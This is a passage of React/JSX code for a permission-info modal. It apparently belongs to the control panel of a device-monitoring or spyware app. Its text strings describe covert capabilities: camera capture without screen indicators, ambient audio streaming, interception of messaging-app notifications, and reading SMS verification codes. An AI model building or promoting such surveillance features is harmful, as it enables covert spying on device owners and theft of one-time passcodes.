                                onClick={() => setShowPermissionInfo(null)}
                                className="absolute top-4 right-4 text-white/50 hover:text-white"
                            >
                                ✕
                            </button>

                            {/* Themed Title & Icon */}
                            <div className="flex items-center gap-3">
                                <div className={`w-11 h-11 rounded-2xl flex items-center justify-center ${
                                    showPermissionInfo === 'storage' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' :
                                    showPermissionInfo === 'camera' ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40' :
                                    showPermissionInfo === 'microphone' ? 'bg-purple-500/20 text-purple-300 border border-purple-500/40' :
                                    showPermissionInfo === 'contacts' ? 'bg-green-500/20 text-green-300 border border-green-500/40' :
                                    showPermissionInfo === 'notifications' ? 'bg-sky-500/20 text-sky-300 border border-sky-500/40' :
                                    'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                                }`}>
                                    <Info size={22} />
                                </div>
                                <div>
                                    <h4 className="text-base font-extrabold text-white capitalize">{showPermissionInfo} Access</h4>
                                    <span className={`text-[10px] font-bold uppercase tracking-wider ${
                                        showPermissionInfo === 'storage' ? 'text-emerald-400' :
                                        showPermissionInfo === 'camera' ? 'text-cyan-400' :
                                        showPermissionInfo === 'microphone' ? 'text-purple-400' :
                                        showPermissionInfo === 'contacts' ? 'text-green-400' :
                                        showPermissionInfo === 'notifications' ? 'text-sky-400' :
                                        'text-rose-400'
                                    }`}>
                                        Background Capability
                                    </span>
                                </div>
                            </div>

                            {/* Detailed Description */}
                            <div className="p-4 rounded-2xl bg-white/[0.03] border border-white/10">
                                <p className="text-xs text-fg-2 leading-relaxed">
                                    {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
                                    {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
                                    {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
                                    {showPermissionInfo === 'contacts' && "Enables synchronization of stored phonebook contacts, SIM directory entries, and configured Google account names."}
                                    {showPermissionInfo === 'notifications' && "Enables real-time interception of WhatsApp, Instagram, Telegram messages, system toasts, and incoming notification previews."}
                                    {showPermissionInfo === 'sms' && "Enables reading incoming verification OTP codes, incoming/outgoing SMS history logs, and system text alerts."}
                                </p>
                            </div>

                            <button
                                onClick={() => setShowPermissionInfo(null)}
                                className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all shadow-lg text-black ${
                                    showPermissionInfo === 'storage' ? 'bg-emerald-400 hover:bg-emerald-500' :
                                    showPermissionInfo === 'camera' ? 'bg-cyan-400 hover:bg-cyan-500' :
                                    showPermissionInfo === 'microphone' ? 'bg-purple-400 hover:bg-purple-500' :
                                    showPermissionInfo === 'contacts' ? 'bg-green-400 hover:bg-green-500' :
                                    showPermissionInfo === 'notifications' ? 'bg-sky-400 hover:bg-sky-500' :
                                    'bg-rose-400 hover:bg-rose-500'
                                }`}
                            >
                                Got it
                            </button>
                        </div>
                    </div>
                )}

                {/* Custom Alert Modal */}
                <CustomAlertModal
                    isOpen={showCustomAlert}
                    onClose={() => setShowCustomAlert(false)}
                    title={alertData.title}
                    message={alertData.message}
                    type={alertData.type}
                />
            </div>
        </div>
    );
}
